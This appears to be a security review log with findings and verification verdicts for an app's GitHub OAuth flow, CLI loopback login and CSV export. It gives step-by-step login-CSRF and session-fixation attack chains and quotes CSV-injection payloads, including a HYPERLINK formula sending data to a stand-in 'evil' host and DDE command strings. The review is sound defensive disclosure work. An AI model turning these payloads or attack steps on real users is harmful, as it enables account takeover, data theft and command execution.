samples.summary: Web GitHub OAuth flow still has no `state` parameter — login CSRF / session fixation on the browser login path
samples.evidence: `GitHubStrategy.authenticate` (github.strategy.ts:57-64) sets `opts.state` ONLY when `req.__cliStateToken` is present, and `GitHubAuthGuard.canActivate` (github-auth.guard.ts:33) only mints that token for `mode === 'cli'`. A plain browser login therefore goes to GitHub with no `state`, and `githubAuthCallback` (auth.controller.ts:119) falls straight through to the web branch (auth.controller.ts:146-150) whenever no `state` query param is present, unconditionally calling `setAuthCookies`. Attack: attacker starts a GitHub OAuth flow for their own account, captures the `code` at the redirect, does not spend it, then causes the victim's browser to top-level-navigate to `https://<api>/auth/github/callback?code=<attacker code>`. The backend resolves the attacker's GitHub identity and writes `wafflebase_session` / `wafflebase_refresh` cookies (SameSite=Lax, so a top-level navigation carries them) into the victim's browser. The victim then works inside the attacker's account and everything they create is readable by the attacker. This diff touches exactly this handler and its risk table, and records the gap as "Open" in docs/design/rest-api.md, so it is pre-existing and disclosed rather than introduced here — but it is a live session-fixation vulnerability in the code under review and the CLI half of the same class was judged worth fixing in this very change.

samples.summary: `GET /auth/github?mode=cli&port=<n>` is an unauthenticated, CSRF-able endpoint that mints a full-privilege auth code for the *victim* and delivers it to an attacker-chosen 127.0.0.1 port; the new nonce does not help because the attacker supplies the nonce
samples.evidence: The guard accepts `mode`/`port`/`nonce` straight off the query string with no user-intent or origin check (github-auth.guard.ts:29-42), and the callback redirects the browser to `http://127.0.0.1:${port}/callback?code=...` (auth.controller.ts:134-136). An attacker page can top-level-navigate the victim to `https://<api>/auth/github?mode=cli&port=<attacker-chosen>&nonce=<attacker-chosen>`; because the victim is already logged in to GitHub and has already authorized the app, GitHub bounces straight back, and the backend mints `createCode(user.id)` for the VICTIM and hands it to whatever is listening on that loopback port. `POST /auth/cli/exchange` is unauthenticated (auth.controller.ts:153-169), so anyone holding that code within 60s gets the victim's access+refresh tokens. The nonce added by this change does not close this direction — the attacker chooses it, so the loopback listener they control accepts it. Exploitation needs an attacker-controlled or URL-logging listener on the victim's loopback (a malicious/compromised local app, a dev server that logs request URLs, a browser-helper daemon), which is why I rate confidence medium rather than high. The CLI's own genuine listener is protected, because its nonce will not match.

samples.summary: CSV formula neutralization is deliberately disabled on `sheets export`, the one CSV path whose file is meant to be opened in a spreadsheet app — untrusted cell content is written verbatim
samples.evidence: `formatCsv(res.data, { neutralizeFormulas: false })` writes server-supplied cell `value`/`formula` fields byte-for-byte into `out.csv`. Every one of those values is settable by any other member of a shared workspace, and `packages/cli/skills/recipe-csv-pipeline.md:44` documents `wafflebase sheets export "$DOC_ID" out.csv` as the terminal step whose product the user opens. A member who plants `=HYPERLINK("http://evil?d="&A1,"click")`, `=WEBSERVICE(...)` (exfiltration) or a DDE payload `=cmd|'/c calc'!A0` gets it executed when the exporting user opens the file in Excel/LibreOffice. The protection this change adds (`csv.ts:23-26`) is wired only into the `--format csv` render path (formatter.ts:61), i.e. the terminal-printed variant, while the file-writing variant opts out. Whatever the round-trip argument, the result is that the more dangerous of the two paths is the unprotected one; a safer split would keep neutralization and give `sheets export` an explicit opt-out flag, or write a format (json) that is not auto-evaluated.

samples.summary: CSV formula neutralizer omits a leading plain space from `FORMULA_TRIGGER`, despite its own comment justifying `\t`/`\r` as "whitespace the importer trims"
samples.evidence: `FORMULA_TRIGGER = /^[=+\-@\t\r]/` covers tab and CR but not U+0020 (or other Unicode whitespace such as U+00A0). `NEEDS_QUOTING = /[",\n\r\t]/` also does not quote a leading space, so a value of `" =HYPERLINK(\"http://evil\",\"x\")"` is emitted bare and unprefixed. Importers that strip leading whitespace on import (LibreOffice's "Trim spaces" CSV option, and several third-party CSV-to-sheet importers) then see `=HYPERLINK(...)` at position 0 and evaluate it — exactly the bypass class the tab/CR entries were added to close. Confidence is low because stock Excel does not trim a leading space, so the bypass depends on the importer; impact if it lands is the same formula execution the neutralizer exists to prevent.

samples.summary: The per-attempt login nonce — the only secret binding the loopback callback — is placed in a child process argv and printed to stderr, making it readable by any other local user during the 30s window
samples.evidence: `const oauthUrl = ...&nonce=${nonce}` (login.ts:40) is then both `console.error`'d (login.ts:41) and passed to `open(oauthUrl)` (login.ts:46), which execs a browser with the URL as an argv element. On Linux `/proc/<pid>/cmdline` is world-readable by default, so any other local account can read the nonce, and the loopback port is trivially discoverable by scanning. Holding both, a local attacker can send `GET http://127.0.0.1:<port>/callback?code=<code minted for the attacker's account>&state=<nonce>` and the CLI accepts it (login.ts:280-288), saving a session for the attacker's account — the same login-CSRF/session-fixation outcome the nonce was introduced to prevent, just from a local rather than a web attacker. Terminal transcripts and CI logs are a second exposure of the same value. Largely inherent to the OAuth loopback pattern (PKCE-style flows have the same property), which is why this is minor, but the code and docs treat the nonce as a secret while handling it as a URL parameter.

samples.summary: The `Origin`-header check on the loopback callback is defeated by DNS rebinding and by ordinary GET navigations, so it is weaker defense-in-depth than the surrounding comments claim
samples.evidence: `if (req.method !== 'GET' || req.headers.origin !== undefined)` (login.ts:267) is the only request-shape gate; the server never validates the `Host` header, and `new URL(req.url ?? '/', 'http://127.0.0.1')` (login.ts:259) discards it entirely. A page whose hostname rebinds to 127.0.0.1 becomes same-origin with the callback server, so its `fetch`/navigation carries no `Origin` header at all and passes the check; likewise a cross-site ``, `

samples.summary: Loopback success response sets no `Cache-Control: no-store` or `Referrer-Policy`, leaving the URL that carries `code` and the nonce in browser history/cache
searchedFor: read startCallbackServer response headers in login.ts:290-327
grep for Cache-Control / Referrer-Policy in packages/cli/src
samples.evidence: `res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' })` (login.ts:290) emits the success page with no cache or referrer directives, so `http://127.0.0.1:<port>/callback?code=…&state=<nonce>` is retained in history and may be cached. Impact is small — the code is single-use with a 60s TTL and has already been consumed by the time the page renders, and the page loads no external subresources so there is no Referer to leak to a third party — but `no-store` plus `Referrer-Policy: no-referrer` on this response is standard hardening for an OAuth landing page and costs nothing.

verdict.reason: Verified in the repository: the web GitHub OAuth flow sends no `state` and the callback accepts any `code` with no per-browser binding. `GitHubStrategy` constructor (github.strategy.ts:43-49) passes no `state`/`store` option to passport-oauth2 (so state defaults off), and `authenticate()` (github.strategy.ts:57-64) injects `opts.state` only when `req.__cliStateToken` is set. I searched wide for a counterexample and found none: main.ts:30-79 installs no session/CSRF middleware and only origin-restricted CORS (which does not constrain navigations); auth.module.ts:13-33 registers no state store other than CliAuthStore, whose createState (cli-auth.store.ts:27-43) is reached only from the CLI branch; the frontend links to a bare `/auth/github` (packages/frontend/src/components/login-form.tsx:27); repo-wide greps for oauth_state/oauthState/state cookie surfaced only the CLI loopback nonce defense (packages/cli/src/commands/login.ts:219). The project's own design doc states the gap is unresolved (docs/design/rest-api.md:384). This is an in-lane auth/CSRF defect (login CSRF / session fixation), critical impact if real, and it is real.

verdict.reason: Every element of the claim verified in the repo. github-auth.guard.ts:28-43 reads mode/port/nonce from req.query with no origin/Referer/CSRF/user-intent check, validating only the port range and nonce charset, so a cross-site top-level navigation reaches it. auth.controller.ts:119-137 then mints createCode(user.id) for the already-authenticated victim and redirects to http://127.0.0.1:{port}/callback?code=...&state=nonce, with both port and nonce derived from the attacker-supplied query string. cli-auth.store.ts:64-79 stores the code as a pure bearer token ({userId, expiresAt}) with no binding to the nonce, state, or browser session, and the csrf value generated at cli-auth.store.ts:32 is never verified anywhere. auth.controller.ts:153-169 (POST /auth/cli/exchange) carries no auth guard and swaps that code for the victim's access+refresh tokens. verdict.reason: Code is present exactly as claimed. sheets-export.ts:52 calls formatCsv with `neutralizeFormulas: false` and writes the result verbatim to the user-named file (line 58). csv.ts:74 makes neutralization strictly conditional on that flag — with it false, only NEEDS_QUOTING quoting is applied, which does not defuse a leading `=`/`+`/`-`/`@`, so `=HYPERLINK(...)`, `=WEBSERVICE(...)` or a DDE payload stored in a cell lands byte-for-byte in out.csv. finding.summary: CSV formula neutralizer omits a leading plain space from `FORMULA_TRIGGER`, despite its own comment justifying `\t`/`\r` as "whitespace the importer trims"
finding.evidence: `FORMULA_TRIGGER = /^[=+\-@\t\r]/` covers tab and CR but not U+0020 (or other Unicode whitespace such as U+00A0). `NEEDS_QUOTING = /[",\n\r\t]/` also does not quote a leading space, so a value of `" =HYPERLINK(\"http://evil\",\"x\")"` is emitted bare and unprefixed. Confidence is low because stock Excel does not trim a leading space, so the bypass depends on the importer; impact if it lands is the same formula execution the neutralizer exists to prevent.

verdict.reason: Verified directly in the repo. packages/cli/src/output/csv.ts:6 defines FORMULA_TRIGGER = /^[=+\-@\t\r]/, whose character class contains only =, +, -, @, TAB, CR — a leading U+0020 (or U+00A0/VT/FF) is not matched, so neutralizeFormula (csv.ts:23-26) returns the value without the neutralizing "'" prefix. csv.ts:38 NEEDS_QUOTING = /[",\n\r\t]/ likewise omits a space. The guard's own comment at csv.ts:2-4 justifies including TAB/CR precisely because they "let a payload hide behind whitespace the importer trims", so a leading space is a gap in the guard's stated threat model rather than deliberate scoping. The vulnerable path is reachable: packages/cli/src/output/formatter.ts:61 calls formatCsv(data, { neutralizeFormulas: true }) for the human --format csv render path, and csv.ts:18-19 documents that the values are server-supplied and settable by another workspace member, so a document title of " @SUM(1+1)" or " =cmd|'/c calc'!A1" is emitted with no prefix. I searched for an upstream trim/sanitizer and found none — neutralizeFormula at csv.ts:24 is the only formula gate — so no already-guarded ground applies. One detail of the reviewer's evidence is imprecise: their sample payload contains "," and '"', so NEEDS_QUOTING would in fact quote it; but CSV field quoting is transport framing and does not stop Excel/Sheets from evaluating a leading =, only the "'" prefix does, and comma-free payloads are emitted entirely bare. That does not refute the defect. CSV/formula injection is in the security lane (unsafe input handling), and impact if it lands is the formula execution the neutralizer exists to prevent; the dependency on importer trim behaviour affects exploitability, not severity, and doubt is not a refutation ground.

searchedFor: grep createState( across packages to find every state-minting site
checked GitHubAuthGuard.canActivate for a non-CLI state path
finding.summary: Web (browser) OAuth callback has no CSRF `state` — login CSRF / session fixation remains fully open while the CLI half is hardened
finding.evidence:
`githubAuthCallback` only consumes a state token when the query carries one (line 119). Every browser login arrives with no `state`: `GitHubStrategy.authenticate` (github.strategy.ts:59-62) sets `opts.state` *only* when `req.__cliStateToken` is present, and `GitHubAuthGuard.canActivate` only mints that token for `mode === 'cli'` (github-auth.guard.ts:33). So the web branch at auth.controller.ts:146-150 mints tokens and calls `setAuthCookies` for any `code` presented, with nothing binding the code to the browser that started the flow.

Attack: attacker starts a GitHub OAuth flow for their own account, stops at the redirect and captures `code=X`, then gets the victim to load `https://<backend>/auth/github/callback?code=X` (image, iframe, link). The victim's browser receives `Set-Cookie: wafflebase_session=<attacker's JWT>` (httpOnly, SameSite=Lax — a top-level navigation carries it fine) and is redirected to FRONTEND_URL. The victim now works inside the attacker's account: everything they create, upload or paste lands in a workspace the attacker owns.

This is pre-existing and the diff itself adds a risk-table row (`docs/design/rest-api.md`) marking it **Open**. I am reporting it because the change hardens exactly this class of attack on the CLI leg while leaving the higher-traffic browser leg unbound, and an acknowledged-in-docs vulnerability is still a vulnerability.

verdict.reason: Verified in-repo: the web OAuth callback has no CSRF state binding, and no counterexample exists anywhere in the backend. auth.controller.ts:119 gates the state-consuming branch on a truthy `state` query param; with none present, control reaches auth.controller.ts:146-150, which mints tokens and calls setAuthCookies for any `code` presented. State is only ever minted for CLI flows (github-auth.guard.ts:33-42, requires mode==='cli' && valid port) and only ever forwarded to GitHub when `req.__cliStateToken` is set (github.strategy.ts:57-63). The strategy's super() config (github.strategy.ts:43-49) does NOT pass `state: true`, so passport-oauth2's session-backed state verification is disabled. Searching wide for an indirect guard found nothing: `express-session` is a package.json dependency (packages/backend/package.json:48) but has zero usages in packages/backend/src; main.ts:30-79 registers only body-parser, cookie-parser, ValidationPipe and CORS — no session middleware and no Origin/Referer/Sec-Fetch-Site check; the sole global guard is ThrottlerGuard (app.module.ts:123); and no `configure(MiddlewareConsumer)`/`forRoutes` exists in src. Only one handler serves `github/callback`. The frontend login is a bare link with no state (login-form.tsx:27). Attack chain completes: attacker obtains a `code` for their own account and induces a top-level navigation to /auth/github/callback?code=X; the victim receives the attacker's session cookies. SameSite=Lax (auth.controller.ts:267) does not mitigate — it restricts outbound cookies, not Set-Cookie on a top-level GET. docs/design/rest-api.md:384 explicitly marks this Open, corroborating rather than refuting. In lane (auth/session binding), impact is account-level session fixation, so it is blocking.

finding.summary: CSV formula neutralization is explicitly disabled on `sheets export`, the one path that writes a file a user opens in Excel — CSV injection survives there
finding.evidence:
`formatCsv(res.data, { neutralizeFormulas: false })` opts the file-writing path out of the defense added in this diff. The exported rows are `{ ref, value, formula }` (see the new test at packages/cli/test/sheets-export.test.ts:57-63), and the `value` column is attacker-settable independently of `formula`: a workspace collaborator can call `sheets cells set <doc> A1 '=cmd|\'/c calc\'!A0'` *without* `--formula`, storing that string as a literal value. `sheets export doc out.csv` then writes it unquoted and unprefixed; opening out.csv in Excel/LibreOffice evaluates it (DDE / HYPERLINK data exfiltration or command execution on the exporting user's machine).

The stated reason — round-tripping through `sheets import` — only requires the `formula` column to stay verbatim; neutralizing the `value` column (or neutralizing on export and teaching `sheets import` to strip a leading `'`) would preserve the pipeline. As written, the render path that prints to a terminal is protected while the path that produces an .csv file on disk is not, which is the inverse of the risk ordering.

Note this is not a regression — `formatCsv` never neutralized before — but the change consciously routes this call site around the new defense, so the mitigation reads as complete when it is not.
